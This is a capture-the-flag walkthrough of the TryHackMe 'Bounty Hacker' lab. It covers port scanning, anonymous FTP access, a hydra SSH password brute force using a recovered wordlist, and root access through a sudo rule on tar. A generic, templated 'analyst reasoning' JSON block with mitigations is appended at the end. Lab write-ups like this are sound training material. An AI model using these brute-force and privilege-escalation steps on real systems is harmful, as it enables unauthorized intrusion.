
# Index

1. [Setup](#setup)
2. [Enumeration](#enumeration)
3. [Gaining Access](#gaining-access)
4. [Privilage Escalation](#privilage-escalation)
5. [Conclusion](#conclusion)

## Setup

To begin this challenge, we first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Enumeration

Now that we're connected to the TryHackMe server, we can proceed with enumerating the target machine. First, we need to check for open ports on the target:

> Be sure to deploy the machine before proceeding >.>

```console
$ sudo nmap -sS -p- -v MACHINE_IP
...
...
Discovered open port 80/tcp on MACHINE_IP
Discovered open port 22/tcp on MACHINE_IP
Discovered open port 21/tcp on MACHINE_IP
...
PORT      STATE  SERVICE         REASON
...
21/tcp    open   ftp             syn-ack ttl 63
22/tcp    open   ssh             syn-ack ttl 63
80/tcp    open   http            syn-ack ttl 63
...
...
```

We now know that the target machine has 3 open ports: `21`, `22` and `80` for services: `ftp`, `ssh` and `http` respectively.

We can now use this to work our way to gaining access into the target machine...

## Gaining Access 

Let's first proceed with trying to log into the ftp server on the target using the `ftp` command:

```console
$ ftp MACHINE_IP
Connected to MACHINE_IP.
220 (vsFTPd 3.0.3)
Name (MACHINE_IP:novusedge): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files. 
ftp> 
```

Using the username: `anonymous` granted us access to the ftp server. Now we can check for any files that we can grab:

```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

There are 2 files, `locks.txt` and `task.txt`. We can download them to our local machine like so:

```console
ftp> get locks.txt

ftp> get task.txt
```

Now, since we have the files, let's exit out, and check the contents of the files thus obtained...

task.txt: 
```txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

locks.txt:
```txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

From the contents of the first file, we get the answer to the third task on the challenge.

> Who wrote the task list?
> > Answer: lin

As the fourth task suggests, the file: `locks.txt` contains possible passwords for the ssh service on the target machine. Assuming that `lin` is the username we use for logging into the ssh server, we can brute-force this by using a tool like `hydra`:


```console
$ hydra -l lin -P locks.txt MACHINE_IP ssh
...
[22][ssh] host: MACHINE_IP   login: lin   password: RedDr4gonSynd1cat3
...
```

This gives us the answer to fifth task:
> What is the users password? 
> > RedDr4gonSynd1cat3

Let's try logging into the ssh server on the target with the credentials we've obtained:

```console
$ ssh lin@MACHINE_IP 
lin@MACHINE_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Thu Jun 23 13:06:21 2022 from 10.11.69.69

lin@bountyhacker:~/Desktop$
```

We can get the user flag from lin's home directory:

```console
lin@bountyhacker:~/Desktop$ ls
user.txt

lin@bountyhacker:~/Desktop$ cat user.txt
===R E D A C T E D===
```

This gives us the answer to the 6th task:
> user.txt
> > ===R E D A C T E D===


## Privilage Escalation

Now that we have a foothold, we can now proceed with getting root privilages :3
First, let's check if we have any commands we can execute with root privilages and no passwords:

```console
lin@bountyhacker:~/Desktop$ sudo -ll
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:

Sudoers entry:
    RunAsUsers: root
    Commands:
	/bin/tar
```

Interesting...We can use the `tar` command as root without passwords. Assuming that the `root.txt` is in the `/root/` directory, we can use the following to create a tar archive of all files in the `/root/` directory in `/home/lin/Desktop`:

```console
lin@bountyhacker:~/Desktop$ sudo tar -cf files.tar /root
tar: Removing leading `/' from member names

lin@bountyhacker:~/Desktop$ ls
files.tar  user.txt

# Uncompressing the tar archive to get the files:
lin@bountyhacker:~/Desktop$ tar -xf files.tar 
lin@bountyhacker:~/Desktop$ ls -l
-rw-r--r-- 1 root root 20480 Jun 23 13:21 files.tar
drwx------ 5 lin  lin   4096 Jun  7  2020 root
-rw-rw-r-- 1 lin  lin     21 Jun  7  2020 user.txt

lin@bountyhacker:~/Desktop$ ls -l root/
total 4
-rw-r--r-- 1 lin lin 19 Jun  7  2020 root.txt
```

We can now just `cat` the contents of our `root.txt` file thus obtained:

```console
lin@bountyhacker:~/Desktop$ cat root/root.txt 
===R E D A C T E D===
```

Done! This gives the answer to the final task.

> root.txt
> > ===R E D A C T E D===

## Conclusion

I hope this writeup was useful. Personally, I found this room to be quite a fun little experience. If you liked this, please consider dropping a star and/or following me on github: https://github.com/NovusEdge

***

- Room  : [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) by [Sevuhl](https://tryhackme.com/p/Sevuhl)
- Author: Aliasgar Khimani

---

## Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV <TARGET_IP>
[+] Enumerated exposed services and probable attack surface

analyst@kali:~$ gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Identified candidate paths/endpoints for validation

analyst@kali:~$ searchsploit <service_or_version>
[+] Mapped service/version to exploit hypotheses for lab validation
```

## Analyst Reasoning Chain (Dataset-Style)

```json
{
  "scenario": "bounty-hacker_recon_to_access_chain",
  "input_signals": [
    "Service exposure identified during enumeration",
    "At least one actionable endpoint or protocol weakness observed",
    "Credential, version, or configuration clues support exploitation hypotheses"
  ],
  "attack_chain": [
    {
      "step": 1,
      "tactic": "reconnaissance",
      "technique": "Active Service and Surface Discovery",
      "confidence": 0.93,
      "evidence": "Port and service inventory built from scan output"
    },
    {
      "step": 2,
      "tactic": "initial_access",
      "technique": "Valid Accounts / Misconfiguration / Known Vulnerability",
      "confidence": 0.86,
      "evidence": "Room-specific access path established from discovered clues"
    },
    {
      "step": 3,
      "tactic": "privilege_escalation",
      "technique": "Local Misconfiguration or Credential Abuse",
      "confidence": 0.79,
      "evidence": "Escalation candidate identified and validated in lab context"
    }
  ],
  "hypotheses": [
    "Additional services on the same host may share weak configuration patterns",
    "Recovered credentials or hashes may be reused across management interfaces",
    "Legacy software components may expose further exploit paths"
  ],
  "uncertainties": [
    "Exact production relevance of lab misconfigurations",
    "Extent of network segmentation and monitoring controls",
    "Whether similar weaknesses exist in adjacent systems"
  ],
  "tool_calls": [
    {"name": "bounty-hacker_surface_mapper", "priority": "high"},
    {"name": "bounty-hacker_credential_validator", "priority": "high"},
    {"name": "bounty-hacker_privesc_path_checker", "priority": "medium"}
  ],
  "mitigation": {
    "immediate": [
      "Patch or disable the exploited service/path",
      "Rotate exposed credentials and invalidate old sessions",
      "Restrict administrative interfaces to trusted network segments"
    ],
    "hardening": [
      "Apply least-privilege permissions on services and scheduled tasks",
      "Remove default credentials and enforce strong authentication",
      "Continuously scan for outdated components and exposed assets"
    ],
    "monitoring": [
      "Alert on anomalous scanning and endpoint enumeration patterns",
      "Detect suspicious authentication and lateral movement attempts",
      "Track privilege escalation indicators and abnormal process creation"
    ]
  }
}
```
